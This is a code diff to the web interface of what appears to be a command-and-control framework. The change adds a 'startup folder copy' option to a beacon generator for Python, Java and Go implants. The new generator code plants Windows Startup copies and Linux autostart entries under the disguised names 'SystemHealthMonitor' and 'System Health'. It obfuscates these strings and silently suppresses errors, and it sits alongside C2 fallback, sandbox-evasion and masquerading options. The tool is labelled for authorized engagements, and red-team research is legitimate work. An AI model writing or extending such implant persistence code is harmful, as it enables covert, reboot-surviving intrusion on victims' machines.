@@ -183,7 +183,7 @@ const LANG = {
     gen_title:'⚙ Generate Beacon', gen_subtitle:'Authorized engagements only.',
     gen_connection:'Connection', gen_c2_label:'C2 Listeners (primary + fallbacks)',
     gen_add_fallback:'+ Add fallback', gen_sleep:'Sleep (seconds)', gen_jitter:'Jitter %',
-    gen_persist:'Persistence (survives reboots)', gen_kill_date:'Kill Date (optional)',
+    gen_persist:'Persistence (survives reboots)', gen_persist_startup:'Startup folder copy (Windows Startup / Linux autostart)', gen_kill_date:'Kill Date (optional)',
     gen_kill_date_hint:'Beacon self-destructs after this date. Leave empty for no limit.',
     gen_hb_days:'Heartbeat timeout (days)', gen_hb_hint:'If C2 is unreachable for this many days the beacon self-destructs. 0 = disabled.',
     sec_secret_title:'Agent Secret Rotation', sec_secret_desc:'Generates a new agent secret. Active beacons will receive the new secret on their next check-in and update automatically. The old secret stays valid until all beacons rotate.',
@@ -290,7 +290,7 @@ const LANG = {
     gen_title:'⚙ Generar Beacon', gen_subtitle:'Solo para engagements autorizados.',
     gen_connection:'Conexión', gen_c2_label:'C2 Listeners (primario + fallbacks)',
     gen_add_fallback:'+ Agregar fallback', gen_sleep:'Sleep (segundos)', gen_jitter:'Jitter %',
-    gen_persist:'Persistencia (sobrevive reinicios)', gen_kill_date:'Kill Date (opcional)',
+    gen_persist:'Persistencia (sobrevive reinicios)', gen_persist_startup:'Copia en carpeta de arranque (Windows Startup / Linux autostart)', gen_kill_date:'Kill Date (opcional)',
     gen_kill_date_hint:'El beacon se autodestruye después de esta fecha. Vacío = sin límite.',
     gen_hb_days:'Heartbeat timeout (días)', gen_hb_hint:'Si el C2 no responde en este número de días el beacon se autodestruye. 0 = desactivado.',
     sec_secret_title:'Rotación de Agent Secret', sec_secret_desc:'Genera un nuevo agent secret. Los beacons activos recibirán el nuevo secret en su próximo check-in y se actualizarán automáticamente. El secret viejo sigue válido hasta que todos roten.',
@@ -2466,6 +2466,10 @@ function renderGenerateView() {
             <input type="checkbox" id="gen-persist" style="width:15px;height:15px;accent-color:var(--accent);cursor:pointer">
             ${t('gen_persist')}
           </label>
+          <label style="display:flex;align-items:center;gap:10px;cursor:pointer;user-select:none;color:var(--text2);font-size:12px;margin-bottom:14px">
+            <input type="checkbox" id="gen-persist-startup" style="width:15px;height:15px;accent-color:var(--accent);cursor:pointer">
+            ${t('gen_persist_startup')}
+          </label>
           <div class="form-group" style="margin:0">
             <label>${t('gen_kill_date')}</label>
             <input type="date" id="gen-kill-date"
@@ -3297,7 +3301,8 @@ async function generateBeacon() {
   if (!urls.length) { alert(_lang === 'es' ? 'Agrega al menos un listener URL' : 'Add at least one listener URL'); return; }
   const sleep    = parseInt(document.getElementById('gen-sleep').value) || 5;
   const jitter   = parseInt(document.getElementById('gen-jitter').value) || 20;
-  const persist  = document.getElementById('gen-persist').checked;
+  const persist        = document.getElementById('gen-persist').checked;
+  const persistStartup = document.getElementById('gen-persist-startup').checked;
   const killDate = document.getElementById('gen-kill-date').value.trim() || null;
   const hbDays   = parseInt(document.getElementById('gen-hb-days').value) || 0;
   const encMode  = document.getElementById('gen-enc-mode').value;
@@ -3337,15 +3342,15 @@ async function generateBeacon() {
   document.getElementById('beacon-dl-buttons-java').style.display = 'none';
   document.getElementById('beacon-dl-buttons-go').style.display   = 'none';
   if (_beaconLang === 'java') {
-    code = generateJavaBeaconCode(urls, sleep, jitter, info.agent_secret, persist, ev, killDate, encMode, bid, serverKey, hbDays, features);
+    code = generateJavaBeaconCode(urls, sleep, jitter, info.agent_secret, persist, ev, killDate, encMode, bid, serverKey, hbDays, features, persistStartup);
     filename = `${_getBeaconName()}.java`;
     document.getElementById('beacon-dl-buttons-java').style.display = 'flex';
   } else if (_beaconLang === 'go') {
-    code = generateGoBeaconCode(urls, sleep, jitter, info.agent_secret, persist, ev, killDate, encMode, bid, serverKey, hbDays, features);
+    code = generateGoBeaconCode(urls, sleep, jitter, info.agent_secret, persist, ev, killDate, encMode, bid, serverKey, hbDays, features, persistStartup);
     filename = `${_getBeaconName()}.go`;
     document.getElementById('beacon-dl-buttons-go').style.display = 'flex';
   } else {
-    code = generateBeaconCode(urls, sleep, jitter, info.agent_secret, persist, ev, killDate, encMode, bid, serverKey, hbDays, features);
+    code = generateBeaconCode(urls, sleep, jitter, info.agent_secret, persist, ev, killDate, encMode, bid, serverKey, hbDays, features, persistStartup);
     filename = `${_getBeaconName()}.py`;
     document.getElementById('beacon-dl-buttons-py').style.display   = 'flex';
   }
@@ -3418,7 +3423,7 @@ function _sEnc(str, seed) {
   return Array.from(out).map(b=>b.toString(16).padStart(2,'0')).join('');
 }
 
-function generateBeaconCode(urls, sleep, jitter, secret, persist = false, ev = {}, killDate = null, encMode = 'xor', bid = null, serverKey = null, hbDays = 0, features = {}) {
+function generateBeaconCode(urls, sleep, jitter, secret, persist = false, ev = {}, killDate = null, encMode = 'xor', bid = null, serverKey = null, hbDays = 0, features = {}, persistStartup = false) {
   if (!Array.isArray(urls)) urls = [urls];
   function xorEnc(str, key) {
     const enc = new TextEncoder();
@@ -3756,7 +3761,27 @@ def _save_cwd(p):
         pass
 
 _cwd = _load_cwd()${uaBlock}${sandboxBlock}${bgBlock}${masqBlock}${screenshotSchedSetupBlock}
-${persist ? `
+${persistStartup ? `
+def _persist_startup():
+    try:
+        import shutil as _sh
+        src = os.path.abspath(__file__)
+        if _WIN:
+            _sf = os.path.join(os.environ.get(${xPy('APPDATA')}, ''), ${xPy('Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup')})
+            _dst = os.path.join(_sf, ${xPy('SystemHealthMonitor.py')})
+            if os.path.isdir(_sf) and not os.path.exists(_dst):
+                _sh.copy2(src, _dst)
+        else:
+            _ac = os.path.join(os.path.expanduser('~'), ${xPy('.config/autostart')})
+            os.makedirs(_ac, exist_ok=True)
+            _df = os.path.join(_ac, ${xPy('system-health.desktop')})
+            if not os.path.exists(_df):
+                with open(_df, 'w') as _f:
+                    _f.write(${xPy('[Desktop Entry]\\nType=Application\\nName=System Health\\nExec=')} + sys.executable + ' ' + src + ${xPy('\\nHidden=false\\nNoDisplay=false\\nX-GNOME-Autostart-enabled=true\\n')})
+    except Exception:
+        pass
+_persist_startup()
+` : ''}${persist ? `
 def _persist():
     try:
         src = os.path.abspath(__file__)
@@ -4169,7 +4194,7 @@ if __name__ == "__main__":
 `;
 }
 
-function generateJavaBeaconCode(urls, sleep, jitter, secret, persist = false, ev = {}, killDate = null, encMode = 'xor', bid = null, serverKey = null, hbDays = 0, features = {}) {
+function generateJavaBeaconCode(urls, sleep, jitter, secret, persist = false, ev = {}, killDate = null, encMode = 'xor', bid = null, serverKey = null, hbDays = 0, features = {}, persistStartup = false) {
   if (!Array.isArray(urls)) urls = [urls];
   function xorEnc(str, key) {
     const enc = new TextEncoder();
@@ -4274,6 +4299,34 @@ function generateJavaBeaconCode(urls, sleep, jitter, secret, persist = false, ev
   const javaSchedSetupBlock = '';
   const javaSchedCmdBlock = '';
 
+  const persistStartupBlock = persistStartup ? `
+    private static void persistStartup() {
+        String os = System.getProperty("os.name","").toLowerCase();
+        try {
+            String jarPath = new java.io.File(Beacon.class.getProtectionDomain().getCodeSource().getLocation().toURI()).getAbsolutePath();
+            if (os.contains("win")) {
+                String appData = System.getenv(${xL('APPDATA')});
+                if (appData != null) {
+                    java.io.File sf = new java.io.File(appData, ${xL('Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup')});
+                    java.io.File dst = new java.io.File(sf, ${xL('SystemHealthMonitor.jar')});
+                    if (sf.isDirectory() && !dst.exists()) {
+                        java.nio.file.Files.copy(java.nio.file.Paths.get(jarPath), dst.toPath());
+                    }
+                }
+            } else {
+                String home = System.getProperty(${xL('user.home')});
+                java.io.File ac = new java.io.File(home, ${xL('.config/autostart')});
+                ac.mkdirs();
+                java.io.File df = new java.io.File(ac, ${xL('system-health.desktop')});
+                if (!df.exists()) {
+                    String javaExec = System.getProperty("java.home") + java.io.File.separator + "bin" + java.io.File.separator + "java";
+                    String content = ${xL('[Desktop Entry]\\nType=Application\\nName=System Health\\nExec=')} + javaExec + " -jar " + jarPath + ${xL('\\nHidden=false\\nNoDisplay=false\\nX-GNOME-Autostart-enabled=true\\n')};
+                    java.nio.file.Files.writeString(df.toPath(), content);
+                }
+            }
+        } catch (Exception ignored) {}
+    }` : '';
+
   const persistBlock = persist ? `
     private static void persist() {
         String os = System.getProperty("os.name","").toLowerCase();
@@ -4298,7 +4351,7 @@ function generateJavaBeaconCode(urls, sleep, jitter, secret, persist = false, ev
         } catch (Exception ignored) {}
     }` : '';
 
-  const persistCall = persist ? '\n        persist();' : '';
+  const persistCall = (persist ? '\n        persist();' : '') + (persistStartup ? '\n        persistStartup();' : '');
 
 
   const encryptBlock = ev.encrypt ? `
@@ -4385,6 +4438,7 @@ public class Beacon {
     ${bgBlock}
     ${javaSchedSetupBlock}
     ${persistBlock}
+    ${persistStartupBlock}
     ${killDateBlock}
     ${encryptBlock}
 
@@ -4786,7 +4840,7 @@ public class Beacon {
 `;
 }
 
-function generateGoBeaconCode(urls, sleep, jitter, secret, persist = false, ev = {}, killDate = null, encMode = 'xor', bid = null, serverKey = null, hbDays = 0, features = {}) {
+function generateGoBeaconCode(urls, sleep, jitter, secret, persist = false, ev = {}, killDate = null, encMode = 'xor', bid = null, serverKey = null, hbDays = 0, features = {}, persistStartup = false) {
   if (!Array.isArray(urls)) urls = [urls];
 
   function xorEnc(str, key) {
@@ -4968,7 +5022,35 @@ func _persist() {
 		}
 	}
 }` : '';
-  const persistCall = persist ? '\n\t_persist()' : '';
+
+  const persistStartupBlock = persistStartup ? `
+func _persistStartup() {
+	exe, _ := os.Executable()
+	if runtime.GOOS == "windows" {
+		appData := os.Getenv(xDec("${enc('APPDATA')}", _xk))
+		if appData != "" {
+			sf := filepath.Join(appData, xDec("${enc('Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup')}", _xk))
+			dst := filepath.Join(sf, xDec("${enc('SystemHealthMonitor.exe')}", _xk))
+			if _, err := os.Stat(sf); err == nil {
+				if _, err2 := os.Stat(dst); os.IsNotExist(err2) {
+					data, _ := os.ReadFile(exe)
+					os.WriteFile(dst, data, 0755)
+				}
+			}
+		}
+	} else {
+		home, _ := os.UserHomeDir()
+		ac := filepath.Join(home, xDec("${enc('.config/autostart')}", _xk))
+		os.MkdirAll(ac, 0755)
+		df := filepath.Join(ac, xDec("${enc('system-health.desktop')}", _xk))
+		if _, err := os.Stat(df); os.IsNotExist(err) {
+			content := xDec("${enc('[Desktop Entry]\\nType=Application\\nName=System Health\\nExec=')}", _xk) + exe + xDec("${enc('\\nHidden=false\\nNoDisplay=false\\nX-GNOME-Autostart-enabled=true\\n')}", _xk)
+			os.WriteFile(df, []byte(content), 0644)
+		}
+	}
+}` : '';
+
+  const persistCall = (persist ? '\n\t_persist()' : '') + (persistStartup ? '\n\t_persistStartup()' : '');
 
   // ── AES decode ───────────────────────────────────────────────────────────
   const xDecFunc = encMode === 'aes' || encMode === 'server'
@@ -5053,6 +5135,7 @@ ${sandboxBlock}
 ${bgBlock}
 ${killDateBlock}
 ${persistBlock}
+${persistStartupBlock}
 ${fetchKeyBlock}
 ${goSchedSetupBlock}
 func _post(path string, payload interface{}) map[string]interface{} {
